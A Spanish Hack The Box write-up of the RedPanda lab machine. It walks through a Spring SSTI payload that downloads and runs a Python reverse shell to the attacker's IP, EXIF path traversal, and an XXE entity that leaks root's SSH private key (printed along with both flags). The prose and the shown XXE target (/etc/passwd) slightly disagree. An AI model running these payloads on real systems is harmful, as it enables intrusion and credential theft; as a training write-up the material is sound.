---
layout: post
title: RedPanda
date: 2023-06-27
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSWE, OSCP]
---
___

<center><img src="/writeups/assets/img/RedPanda-htb/RedPanda.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* SSTI

* Análisis de código fuente

* XXE - Arbitrary File Read (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.170 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-27 18:37 GMT
Nmap scan report for 10.10.11.170
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 11.45 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,8080 10.10.11.170 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-27 18:37 GMT
Nmap scan report for 10.10.11.170
Host is up (0.050s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Tue, 27 Jun 2023 18:46:27 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Tue, 27 Jun 2023 18:46:27 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Tue, 27 Jun 2023 18:46:27 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94%I=7%D=7/27%Time=64C2B976%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charse
SF:t=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Tue,\x2027\x20Jun\x20
SF:2023\x2018:46:27\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20\
SF:x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"woode
SF:n_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codepe
SF:n\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"stylesh
SF:eet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/c
SF:ss\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20w
SF:ith\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20\
SF:x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20r
SF:ight'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x
SF:20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</
SF:div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x
SF:20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Tu
SF:e,\x2027\x20Jun\x202023\x2018:46:27\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/
SF:html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435
SF:\r\nDate:\x20Tue,\x2027\x20Jun\x202023\x2018:46:27\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>H
SF:TTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x2
SF:0type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1
SF:,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x
SF:20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px
SF:;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{heigh
SF:t:1px;background-color:#525D76;border:none;}</style></head><body><h1>HT
SF:TP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html
SF:>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.76 seconds

```

## Puerto 8080 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.170:8080
http://10.10.11.170:8080 [200 OK] Content-Language[en-US], Country[RESERVED][ZZ], HTML5, IP[10.10.11.170], Title[Red Panda Search | Made with Spring Boot]
```

La página principal se ve así:

<img src="/writeups/assets/img/RedPanda-htb/1.png" alt="">

El panel de búsqueda refleja el input en el output

<img src="/writeups/assets/img/RedPanda-htb/2.png" alt="">

Es vulnerable a SSTI

<img src="/writeups/assets/img/RedPanda-htb/3.png" alt="">

Pero en caso de que quiera ejecutar comandos con los payloads típicos me bloquea ciertos caracteres

<img src="/writeups/assets/img/RedPanda-htb/4.png" alt="">

Introduzco una ruta que no existe, y aparece un error descriptivo con el nombre ```WhiteLabel```

<img src="/writeups/assets/img/RedPanda-htb/5.png" alt="">

Encuentro este [artículo](https://exploit-notes.hdks.org/exploit/web/framework/java/spring-pentesting/) en el que explican un SSTI para esta ocasión

<img src="/writeups/assets/img/RedPanda-htb/6.png" alt="">

Creo un archivo ```index.html``` que se encargue de enviarme una reverse shell

```null
#!/bin/bash

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Lo subo al servidor

```null
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl 10.10.16.10 -o /tmp/shell")}
```

Y ejecuto

```null
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("bash /tmp/shell")}
```

Gano acceso en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.11.170] 47532
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
woodenk@redpanda:/tmp/hsperfdata_woodenk$ export TERM=xterm
woodenk@redpanda:/tmp/hsperfdata_woodenk$ export SHELL=bash
woodenk@redpanda:/tmp/hsperfdata_woodenk$ stty rows 55 columns 209
```

Puedo ver la primera flag

```null
woodenk@redpanda:~$ cat user.txt 
3897d0b9d558c17ad2a1bac368315716
```

# Escalada

Pertenezco al grupo ```logs```

```null
woodenk@redpanda:/$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```

Busco por archivos pertenecientes a este

```null
woodenk@redpanda:/$ find \-group logs 2>/dev/null | grep -vE "/home/woodenk/|proc|tmp"
./opt/panda_search/redpanda.log
./credits
./credits/damian_creds.xml
./credits/woodenk_creds.xml
```

Pero no tienen nada relevante, así que paso a otra cosa. Subo el ```pspy``` para detectar tareas que se ejecutan a intervalos regulares de tiempo

```null
2023/06/27 20:00:01 CMD: UID=0    PID=2280   | /bin/sh /root/run_credits.sh 
2023/06/27 20:00:01 CMD: UID=0    PID=2282   | sudo -u woodenk /opt/cleanup.sh 
2023/06/27 20:00:01 CMD: UID=0    PID=2281   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
2023/06/27 20:00:01 CMD: UID=1000 PID=2284   | /bin/bash /opt/cleanup.sh 
2023/06/27 20:00:01 CMD: UID=1000 PID=2291   | 
2023/06/27 20:00:01 CMD: UID=1000 PID=2293   | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ; 
2023/06/27 20:00:01 CMD: UID=1000 PID=2303   | /usr/bin/find /tmp -name *.jpg -exec rm -rf {} ; 
2023/06/27 20:00:01 CMD: UID=1000 PID=2304   | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ; 
2023/06/27 20:00:01 CMD: UID=1000 PID=2305   | /usr/bin/find /dev/shm -name *.jpg -exec rm -rf {} ; 
2023/06/27 20:00:01 CMD: UID=1000 PID=2306   | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ; 
2023/06/27 20:02:01 CMD: UID=0    PID=2310   | /usr/sbin/CRON -f 
2023/06/27 20:02:01 CMD: UID=0    PID=2312   | /bin/sh /root/run_credits.sh 
2023/06/27 20:02:01 CMD: UID=0    PID=2311   | /bin/sh -c /root/run_credits.sh 
2023/06/27 20:02:01 CMD: UID=0    PID=2313   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
2023/06/27 20:04:01 CMD: UID=0    PID=2332   | /bin/sh -c /root/run_credits.sh 
2023/06/27 20:04:01 CMD: UID=0    PID=2331   | /usr/sbin/CRON -f 
2023/06/27 20:04:01 CMD: UID=0    PID=2334   | /bin/sh /root/run_credits.sh 
2023/06/27 20:04:01 CMD: UID=0    PID=2333   | /bin/sh /root/run_credits.sh 
```

El directorio ```/opt/panda_search``` tiene un archivo LOG, que en un principio está vacío

```null
woodenk@redpanda:/opt/panda_search$ cat redpanda.log 

```

Pero al tramitar una petición a la web se actualiza

```null
curl -s -X GET http://10.10.11.170:8080/search
```

```null
woodenk@redpanda:/opt/panda_search$ cat redpanda.log 

405||10.10.16.10||curl/7.88.1||/error
404||10.10.16.10||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36||/img
404||10.10.16.10||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36||/error
```

Busco por el archivo que crea esta estructura

```null
woodenk@redpanda:/opt$ grep -r "redpanda.log"
Binary file panda_search/target/classes/com/panda_search/htb/panda_search/RequestInterceptor.class matches
panda_search/src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java:        FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
Binary file credit-score/LogParser/final/target/classes/com/logparser/App.class matches
credit-score/LogParser/final/src/main/java/com/logparser/App.java:        File log_fd = new File("/opt/panda_search/redpanda.log");
```

Analizo el contenido de ```/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java```

```null
woodenk@redpanda:/opt$ cat credit-score/LogParser/final/src/main/java/com/logparser/App.java
package com.logparser;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {
    
            
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}
```

El contenido del metadato ```Artist``` se está empleando para crear una ruta. Utilizo una imagen ```JPG``` cualquiera para añadirle este y apuntar a un XML que crearé de mi lado en la ruta ```/tmp```

```null
exiftool rubbx.jpg -Artist=../../../../../../../../../tmp/rubbx
Warning: [minor] Ignored empty rdf:Bag list for Iptc4xmpExt:LocationCreated - rubbx.jpg
    1 image files updated
```

Inyecto la imagen para que se interprete

```null
woodenk@redpanda:/opt/panda_search$ echo "304||10.10.16.10||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36||/../../../../../../../../tmp/rubbx.jpg" >> redpanda.log 
```

Descargo el archivo ```export.xml``` desde la web, que es donde voy a probar un XXE para exfiltrar archivos internos

<img src="/writeups/assets/img/RedPanda-htb/7.png" alt="">

Lo modifico indicando con una entidad que quiero cargar en la etiqueta ```<views>``` la ```id_rsa``` del usuario ```root```

```null
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>/img/angy.jpg</uri>
    <views>&xxe;</views>
  </image>
  <image>
    <uri>/img/shy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/crafty.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/peter.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Le asigno el permiso ```777``` para que pueda ser sobrescrito

```null
woodenk@redpanda:/opt/panda_search$ chmod 777 /tmp/rubbx_creds.xml 
```

Obtengo la clave

```null
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<credits>
  <author>damian</author>
  <image>
    <uri>/img/angy.jpg</uri>
    <views>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</views>
  </image>
  <image>
    <uri>/img/shy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/crafty.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/peter.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

La introduzco en un archivo y utilizo como archivo de identidad para ver la segunda flag

```null
ssh root@10.10.11.170 -i id_rsa
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 28 Jun 2023 05:19:31 PM UTC

  System load:           0.0
  Usage of /:            80.9% of 4.30GB
  Memory usage:          48%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.170
  IPv6 address for eth0: dead:beef::250:56ff:feb9:aa0f


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jun 30 13:17:41 2022
root@redpanda:~# cat /root/root.txt 
481b976d12d2a03e8de55d0e673f6668
```